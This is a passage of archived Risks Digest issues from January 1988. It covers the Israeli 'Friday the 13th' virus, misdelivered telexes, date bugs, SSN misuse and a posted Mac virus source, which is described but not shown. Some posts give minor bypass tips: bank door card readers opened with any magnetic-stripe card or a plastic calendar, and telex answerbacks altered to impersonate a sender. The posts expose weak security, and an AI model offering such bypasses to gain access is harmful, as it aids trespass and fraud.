he did it," Radai said.
  He said the saboteur "had to be very clever because he knew how to write
directly into the disk controller and evade the computer's ordinary
safeguards."
  The saboteur exploited a standard programming technique to insert the virus
into the computer's memory, said Radai.
  The computer infected all disk files exposed to it and they, in turn,
contaminated healthy computers and disks.
  Radai said the saboteur's target date to wipe out the files was Friday, May
13, 1988. Unless computer users apply the antidote developed by the university,
they will lose disks afflicted with the virus on that day.
  Meanwhile, the saboteur decided to wreak some minor havoc. His virus ordered
contaminated programs to slow down on Fridays and the 13th day of the month.
  But the prank was the first obvious indication something was wrong with
apparently healthy computer disks, said Shai Bushinski, a self-employed
computer expert knowledgeable about the virus.
  Another clue was derived from a flaw in the virus itself.
  Instead of infecting each program or data file once, the malignant orders
copied themselves over and over, consuming increasing amounts of memory space.
  Computer experts noticed that supposedly static programs were inexplicably
growing in size and launched a search for the cause.
  Bushinsky said experts isolated the malignant commands, which appeared in
easily decipherable assembly language.
  Within a few hours three university computer experts devised a two-phased
program, called "immune" and "unvirus," which tells users whether their disks
have been infected and applies an antidote to those that have.
  Bushinsky said the computer virus was a new and dangerous development in the
computer world that could penetrate military, industrial and commercial data
systems.
  "It might do to computers what AIDS has done to sex," said Bushinsky. "The
current free flow of information will stop. Everyone will be very careful who
they come into contact with and with whom they share their information." 

    [Also noted by Gene Spafford, spaf@purdue.edu, who read it in the 
    8 Jan 88 Lafayette &lt;Indiana&gt; Journal and Courier, under the title
    "Computer virus' potential horrifies experts.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: getting into ATM rooms -- Play-Safe: it could save your life
</A>
</H3>
<address>
Bob Larson
&lt;<A HREF="mailto:blarson%skat.usc.edu@oberon.usc.edu ">
blarson%skat.usc.edu@oberon.usc.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 8 Jan 88 03:51:50 GMT
Organization: USC AIS, Los Angeles

USC uses similar card readers to control access to restricted parking areas.
Frequently, any card can be used to open them.  (They just fixed most of
them again.)  I've also heard that quarters no longer work in place of
tokens as the other way of getting in.  (The tokens are for delivery men, etc.)

Bob Larson blarson@skat.usc.edu Uucp: {sdcrdcf,cit-vax}!oberon!skat!blarson
Prime:	info-prime-request%fns1@ecla.usc.edu oberon!fns1!info-prime-request

</PRE>
<HR><H3><A NAME="subj3.2">
Re: getting into ATM rooms -- Play-Safe: it could save your life
</A>
</H3>
<address>
Fuat C. Baran 
&lt;<A HREF="mailto:fuat@cunixc.columbia.edu">
fuat@cunixc.columbia.edu
</A>&gt;
</address>
<i>
Fri, 8 Jan 88 14:20:23 EST
</i><PRE>

In New York, Citibank's doors at their banking centers will only open
if you have a valid Citicard.  There is a noticeable delay between the
time when you insert the card and when the door buzzes open.

On the other hand, all NY banks that are a member of NYCE (New York Cash
Exchange), Cirrus, etc. have card readers in their doors that will accept
practically any card with a magnetic stripe on it.
                    					--Fuat

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Power lines
</A>
</H3>
<address>
&lt;<A HREF="mailto:woton!riddle@im4u.utexas.edu">
woton!riddle@im4u.utexas.edu
</A>&gt;
</address>
<i>
Thu, 7 Jan 88 23:36:21 cst
</i><PRE>

Although the more prominent health controversy these days is indeed about
high-voltage long-distance power lines, there are also wild stories
circulating in what might be called "New Age" circles about the risks to
health posed by ordinary household AC.  The last person to lecture me on the
subject claimed that AC disrupted the body's natural "electromagnetic system,"
a system which is ignored by Western medicine but on which acupuncture is
based.  She also claimed that the problem is only found in the U.S., since in
Europe they use DC, not AC (sic!).  The solution she offered was to live in
the country in a house with minimal electrical appliances and to sleep with
your body pointing north (?) in order to be in line with the earth's
"electromagnetic fields."

I have no idea whether or not there might be some actual basis in fact for
these concerns, but the people raising them usually wrap them in such
mumbo-jumbo that it's hard to take them seriously.  This is sad, since I am a
firm believer in the possibility that there are risks which become ubiquitous
in industrial civilization before we pay them much attention.  (For instance,
can anybody tell me what my eyesight will be like when I'm sixty-five and have
been squinting at CRTs on a daily basis for 50 years?  And I expect that
future generations will scarcely believe our stupidity in dealing with toxic
and nuclear wastes and the immense quantities of plastics and other less toxic
but non-biodegradable waste which we churn out every day.)  Unfortunately the
people who raise such concerns sometimes seem to be those who will believe
*anything*.

Prentiss Riddle
Opinions expressed are not necessarily those of Shriners Burns Institute.
riddle@woton.UUCP  {ihnp4,harvard}!ut-sally!im4u!woton!riddle

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.05.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.07.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-43</DOCNO>
<DOCOLDNO>IA012-000130-B023-263</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.7.html 128.240.150.127 19970217015102 text/html 18649
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:49:11 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 7</TITLE>
<LINK REL="Prev" HREF="/Risks/6.06.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.08.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.06.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.08.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 7</H1>
<H2> Monday, 11 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
You don't need a computer to have a technical RISK.  
</A>
<DD>
<A HREF="#subj1.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Leap second leaps seconds 
</A>
<DD>
<A HREF="#subj2.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Plan to automate Federal tax collection system? 
</A>
<DD>
<A HREF="#subj3.1">
John Gilmore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Creative quality control in missile systems? 
</A>
<DD>
<A HREF="#subj4.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: getting into ATM rooms 
</A>
<DD>
<A HREF="#subj5.1">
Eric Skinner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re:  PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj6.1">
Scot E. Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Computer asks you your SSI number as ID 
</A>
<DD>
<A HREF="#subj7.1">
Hank Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Computer Virus.... sources(!) 
</A>
<DD>
<A HREF="#subj8.1">
David HM Spector
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Reagan Signs Bill Governing Computer Data 
</A>
<DD>
<A HREF="#subj9.1">
Hugh Pritchard
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Indianapolis Air Force jet crash 
</A>
<DD>
<A HREF="#subj10.1">
Dave Curry
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
You don't need a computer to have a technical RISK. (Jackson Post-ing)
</A>
</H3>
<address>
Joe Morris (jcmorris@mitre.arpa) 
&lt;<A HREF="mailto:jcmorris@mitre.arpa">
jcmorris@mitre.arpa
</A>&gt;
</address>
<i>
Sat, 09 Jan 88 12:22:20 EST
</i><PRE>

With the frequent (and valid) complaints about how the computer is fostering
an impersonal society, it was with some interest that I read an article in
the Washington Post last week in which the Post reported that Jesse Jackson's
campaign headquarters had sent him a telex message which suggested some 
approaches which he could use in the upcoming primary campaigns.

The telex didn't go to Jackson; instead, it was delivered to the Washington
Post's telex machine.  The Post, of course, printed excerpts from it in the
article.  (There weren't any smoking pistols in the material.)

Jackson's campaign manager told the Post that it wasn't a staff error and
must have been the machine, since he (the manager) was the person who
operated the machine when the text was sent.  The article didn't say just
how the machine could have been at fault.

Even if this turns out to be a case in which the operator dialed the wrong
number, it does illustrate the problem of systems in which the routing system
uses non-obvious addressing.  An envelope addressed to "The Washington Post"
would have been easily seen as not appropriate for an internal political memo,
but an E-mail address of (202)-334-6100 isn't obviously an inappropriate one
unless you notice that 202 is not equal to 319 (D.C. vs. Iowa)...  and that
assumes that you aren't using a computer-driven telex system in which you
might not see the conversion from a nickname to a phone number.

What feedback mechanisms are (should) there be to prevent this kind of
misdelivery for electronic mail?  We've all seen the occasional red-faced
apologies on the net from sites which let test messages escape.

(I don't have the article in front of me, and may have some minor details
wrong, so no flames, please...)      Joe Morris

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Leap second leaps seconds
</A>
</H3>
<address>
Alan Wexelblat 
&lt;<A HREF="mailto:wex%SW.MCC.COM@MCC.COM">
wex%SW.MCC.COM@MCC.COM
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 15:39:46 CST
</i><PRE>

[Excerpted from the AP wire]

DETROIT - Michigan Bell Telephone Company took about 3 1/2 days to make up
one second.  The company's computer-operated telephone time service wasn't
adjusted at [...] midnight New Year's Eve, Greenwich Mean Time to account
for the "leap second" between 1987 and 1988.  The adjustment is needed to
synchronize the world's steadily running atomic clocks with the ever-slowing
rotation of the Earth.  But people who set watches or synchronized
activities by Michigan Bell's time signal were one second off during the
weekend.  We thought the change was automatically in the (computer's)
program.  We manually added the second" Monday morning, said a Michigan Bell
spokeswoman.

--Alan Wexelblat  UUCP: {harvard, gatech, pyramid, &amp;c.}!sally!im4u!milano!wex
Information deteriorates upward through bureaucracies.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Plan to automate Federal tax collection system?
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu ">
hoptoad.UUCP!gnu@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Fri, 8 Jan 88 22:06:40 PST
</i><PRE>

I found this in the CPA Client Bulletin, July 1987, copyright 1987 by the
American Institute of Certified Public Accountants, reproduced without
perdition.

           Deposit Taxes by Phone:  How Easy Can It Get?

Tax practitioners are warily watching the development of a government plan to
automate the federal tax deposit system.  They're mostly in favor of getting
rid of glitches in the present system but worry that a new, computerized
method could cause added work and expense for very small businesses, some of
which would be unable to participate at all because of lack of sophistication
or even lack of such basic resources as a computer or touch telephone.

Under the present system, taxpayers remit payroll taxes, corporate taxes,
excise taxes and the like into Treasury accounts at authorized financial
depositories.  Nearly 70 percent of all government revenues are received in
this manner.

Under the new system, a taxpayer might feed the information directly into one
of Uncle Sam's computers, which would debit the taxpayer's bank account
directly.  This is another source of uneasiness among some tax practitioners
queried about preliminary plans for the new system -- IRS access to bank
accounts.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Creative quality control in missile systems? 
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 11 Jan 88 14:45:16 EST

From O'Malley &amp; Gratteau INC. column, Chicago Tribune, Jan. 11, 1988:

  Just in case you were gaining confidence in the U.S. Military:  A barely
noticed July 31, 1987, report by the U.S. House Armed Services Committee on
the sale of military equipment to the Islamic Republic of Iran included this
passage: "As a result of other errors within the Army, the entire last
shipment of 500 missiles had a faulty battery that has caused a dangerous
fly-back problem."  What's a fly-back?  It means the rockets had a tendency
to dribble out of the tube, fall on the ground and then ignite.  We presume
there was a no-return policy.
                                               Dave Curry, Purdue University

                                    [They returned all by themselves!  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Re: getting into ATM rooms
</A>
</H3>
<address>
Eric Skinner 
&lt;<A HREF="mailto:ERS2F%UOTTAWA.BITNET@CUNYVM.CUNY.EDU">
ERS2F%UOTTAWA.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 06 Jan 88 21:53:38 EST
</i><PRE>

  In RISKS 6.4, mar@ATHENA.MIT.EDU writes:
  &gt;Yesterday I tried an experiment, and discovered that my AT&amp;T calling
  &gt;card, and even a rapid transit pass would open the door...

Even worse, many of these locks will open if you simply stick something
thick into them.  One of those handy wallet-sized plastic calendars
does the trick on many doors.

It seems like the locks are there to inspire confidence instead of
actually protecting;  perhaps the banks feel that decent locks are
too expensive?

Eric Skinner, University of Ottawa

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re:  PCs die of New Year Cerebration
</A>
</H3>
<address>
Scot E. Wilcoxon
&lt;<A HREF="mailto:umn-cs!datapg.MN.ORG!sewilco@cs-gw.D.UMN.EDU ">
umn-cs!datapg.MN.ORG!sewilco@cs-gw.D.UMN.EDU 
</A>&gt;
</address>
<i>
Mon, 11 Jan 88 0:50:45 CST
</i><PRE>

I found more details about my previous report.  At least some Stearns brand
PC compatibles fail at boot up in 1988.  A message "bad or missing command
interpreter" is issued, perhaps due to something in the config.sys file.

A problem on Sun machines was mentioned here, and there are reports on USENET
of another PC compatible with problems due to 1988.  Three unrelated
sensitivities to 1988 may seem like a lot, except there are now hundreds of
computer manufacturers able to cause errors.  With specialty chips in wide use,
a date-sensitive error in millions of appliances is only a matter of time.

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	ihnp4!meccts!datapg!sewilco
Data Progress		C and UNIX consulting	+1 612-825-2607

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
computer asks you your SSI number as ID (Wang ad)
</A>
</H3>
<address>
Hank Roberts
&lt;<A HREF="mailto:well!hank@lll-crg.llnl.gov ">
well!hank@lll-crg.llnl.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 7 Jan 88 22:43:20 GMT

From the 1-6-88 Wall Street Journal, ad on page 8:

"Employee Pension fund.  A guy wants to check his pension.  What he's got.
What he can borrow against.  How his fund's performing.  Calls the State office
A Wang VS computer answers.  Speaks.  Asks for social security number.  Dials
it in.  It leads him through a menu...status, equity, performance or human
interface...you know...a real person.  They handle a thousand calls a day."

 -- one hopes the machine can do voice recognition ....

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Computer Virus.... sources(!) 
</A>
</H3>
<address>
David HM Spector 
&lt;<A HREF="mailto:spector@vx2.GBA.NYU.EDU">
spector@vx2.GBA.NYU.EDU
</A>&gt;
</address>
<i>
Sun, 10 Jan 88 22:27:46 EST
</i><PRE>

Just when you thought its was safe to play with computers...

With all of the traffic in Risks digest dealing with Computer Viruses,
letter bombs et al, I though I'd pass this one on.  A programmer in West
Germany has posted to Compu$erve the _source_ to a simple virus that will 
run on a Macintosh computer.

I normally wouldn't even dare to mention that such a thing exists in a
"public" forum, but it's on Compuserve, so it might as well be painted on
walls coast to coast.

The author insists that it's is a very simple virus, easily defeated, 
(which it is, having looked at and understood the sources), and is posted for 
educational uses with the intent of making people aware that such things exist 
and to inspire them to write defenses against them.  

In terms of a program, it's very small, a few pages of Pascal, and maybe
50 lines of assembly code.  The installation code has a bunch of flags to 
control whether or not the virus replicates, whether it gets installed into 
the current running application, or just the system software, etc, etc. 
The actual virus is a small piece of code disguised as a resource that 
inserts itself in a system trap handler...it's alarmingly straight forward.

The author goes on to mention, in the documentation, that this virus was
inspired by a number of viruses he has encountered that did damage to his 
systems, so he wrote a virus that won't let "unknown" programs run on any of 
his company's machines.  (i.e., if the program(s) to be run aren't already 
infected with HIS virus, they won't be allowed to run at all.)

This is the first time I have ever seen sources to something like this, and it
scares me a lot. If this code is any indication, viruses in general are a snap 
to write -- an could be placed _anywhere_; even in innocent looking HyperCard
Stacks (Apple's HyperText software...) that thousands of people and User's
Groups download and give out all over the place (and most Mac users aren't 
computer professionals -- they'll never know what hit'em).

[Come to think of it, this is right out of the story _True Names_ by 
Vernor Vinge...]

Now, let's see, first thing is to unplug my MacintoshII's modem, then...  

David HM Spector				New York University
Senior Systems Programmer			Graduate School of Business
Arpa: SPECTOR@GBA.NYU.EDU			Academic Computing Center
UUCP:...!{allegra,rocky,harvard}!cmcl2!spector	90 Trinity Place, Rm C-4
MCIMail: DSpector/Compu$erve: 71260,1410	New York, New York 10006

            [There are 10 more messages on viruses pending, but with
            considerable overlap.  I'll get to them soon!  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Reagan Signs Bill Governing Computer Data
</A>
</H3>
<address>
Hugh Pritchard
&lt;<A HREF="mailto:<PRITCHAR%CUA.BITNET@CUNYVM.CUNY.EDU> ">
&lt;PRITCHAR%CUA.BITNET@CUNYVM.CUNY.EDU&gt; 
</A>&gt;
</address>
<i>
Sat, 9 Jan 88 14:08 EST
</i><PRE>

[Repeated without permission from the business section of
_The_Washington_Post_ of Saturday, Jan 9, 1988]

[headlined] Reagan Signs Bill Governing Computer Data

President Reagan yesterday signed a bill intended to tighten security of
computer systems that store nonclassified data such as census, tax and
business records.  The National Bureau of Standards is to develop programs to
protect the machines from being illegally tapped by outsiders.

The law overrides a national security directive that Reagan issued in 1984
giving the Pentagon's National Security Agency responsibility for safe-
guarding the data.  Later, the White House created a new classification of
data for protection -- "sensitive but unclassified."

The measures led to criticism in Congress that the government was tightening
the flow of information and expanding military authority.  The new law places
responsibility for civilian computer security in civilian hands, but provides
for the NSA to give technical advice to the bureau.  The law also specifies
that nothing in it will be used to restrict disclosures under the Freedom of
Information Act.

[end of article]

/Hugh Pritchard,        Systems Programming             PRITCHARD@CUA.BITNET

The Catholic University of America Computer Center      (202) 635-5373
Washington, DC  20064  USA

Disclaimer:  My views aren't necessarily those of the Pope.

               [Sounds like HR 145, but none of the articles said so!  PGN]

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Indianapolis Air Force jet crash
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 09 Jan 88 23:08:46 EST

From The Lafayette (Indiana) Journal &amp; Courier, Jan. 9th, 1988.

  INDIANAPOLIS - A failed gearbox was blamed Friday for causing the engine to
fail in the Air Force fighter jet that crashed Oct. 29 into a hotel, killing
10 people, a published report said.
  The military jet, piloted by Maj. Bruce L. Teagarden, lost its ignition
and air-fuel mixture systems when a gearbox part failed, _The Indianapolis
Star_ reported in today's editions, quoting an unreleased Air Force report
due to be released next week.

--Dave Curry, Purdue University

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.06.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.08.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-44</DOCNO>
<DOCOLDNO>IA012-000130-B023-287</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.8.html 128.240.150.127 19970217015119 text/html 18958
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:49:45 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 8</TITLE>
<LINK REL="Prev" HREF="/Risks/6.07.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.09.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.07.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.09.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 8</H1>
<H2> Tuesday, 12 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Missent Missives 
</A>
<DD>
<A HREF="#subj1.1">
Martin Ewing
</A><br>
<A HREF="#subj1.2">
 Leonard B. Bliss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Touch-Tone Risks 
</A>
<DD>
<A HREF="#subj2.1">
Andrew Vaught
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  American Express Computer Problem 2 
</A>
<DD>
<A HREF="#subj3.1">
Frank Wales
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj4.1">
Scott Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  UK Logic Bomb Case is Thrown Out 
</A>
<DD>
<A HREF="#subj5.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  SSN abuse warned about long ago 
</A>
<DD>
<A HREF="#subj6.1">
Richard Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  SSN Required Disclosures -- library social security privacy 
</A>
<DD>
<A HREF="#subj7.1">
Steve Cisler
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Missent Missives
</A>
</H3>
<address>
Martin Ewing
&lt;<A HREF="mailto:msesys@DEImos.Caltech.Edu ">
msesys@DEImos.Caltech.Edu 
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 15:05:39 PST
</i><PRE>

Telex service does give you a more-or-less positive feedback as to whom you've
been connected to.  It's called the "answerback code", which is sent at the
initiation of a connection and whenever you (the sender) transmit a WRU (who
are you) control character.  Each machine is give a supposedly unique (and
usually mnemonic) code when it is installed; it has a length of 8 characters
or so.

You might think a campaign manager would alert to the Washington newspaper's
answerback, but it's all too easy to overlook the code until after the message
is sent.

Telex is an odd medium, slow and fundamentally two-way, but it
is almost always used in a one-way unattended receiver mode.

Martin Ewing, Caltech

   [It used to be a relatively easy matter to break off a few tynes on
   your answer-back drum, or indeed install a different one, thus being
   able to masquerade as someone else.  Perhaps it is harder now?  
   Somehow I doubt it.  PGN]

</PRE>
<HR><H3><A NAME="subj1.2">
Missent Missives
</A>
</H3>
<address>
Leonard B. Bliss
&lt;<A HREF="mailto:ecsvax!blissl@mcnc.org ">
ecsvax!blissl@mcnc.org 
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 10:46:11 est
</i><PRE>

Joe Morris asks, concerning misdelivery of E-mail due to human error,
"What feedback mechanisms are (should) there be to prevent this kind
of misdelivery for electronic mail?"  I suggest that the answer to this
question is, "None!"  There comes a point where human beings must be made
to accept the consequences of their actions and something akin to not
noticing that 202 (D.C. area code) is not equal to 319 (Iowa area code) is
decidedly one of those times.  While machines make our work faster, easier,
and more comfortable, there is probably a limit to the extent that they
should protect us from our own stupidity.  Certainly, the misaddressing of
E-mail described by Joe has passed that limit.  However, it would be
interesting for us to attempt to pin-point precisely (or at least 
approximately) where that limit is.  Any ideas out there?

Len Bliss, Appalachian State University, College of Education, Boone, NC 28608

     [One widely used notion is that of REDUNDANCY -- including check sums.
     The notion that anyone can call your home (10 digits) and with another
     single digit can (1) read your answering machine messages, (2) turn on
     your oven, (3) turn your burglar alarm on or off, (4) feed the dog, ...
     is somewhat hair-raising.  One way of making unlisted numbers much 
     harder to find by sequential dialing experiments would be to use the
     European technique of variable-length phone numbers.  You want a
     difficult number?  Get one with 20 digits.  It would also cut down
     on random wrong numbers.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
     Touch-Tone Risks
</A>
</H3>
<address>
        Andrew Vaught 
&lt;<A HREF="mailto:29284843%WSUVM1.BITNET@CUNYVM.CUNY.EDU">
29284843%WSUVM1.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 15:46:42 PLT
</i><PRE>

  Washington State University, like several other universities in the
area is currently planning on implementing a registration system based
on touch tone phones. The student dials the computer, and when connected
"dials" his/her ID number, followed by a five-digit number associated with
specific classes. The computer will either sign a person up, or inform the
caller that the class is full.
  The ID numbers are eight digits long, which would give some protection
against someone using someone else's number. The only problem is that on
the local IBM mainframe (under VM/CMS), student userid's are the ID
numbers, and there are some pretty huge NAMES files floating around.
  The potential for abuse is there, especially considering that one could
use dial-out modems on the system.....
                                                 Andy

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
American Express Computer Problem 2
</A>
</H3>
<address>
Frank Wales 
&lt;<A HREF="mailto:mcvax!zen.co.uk!frank@uunet.UU.NET">
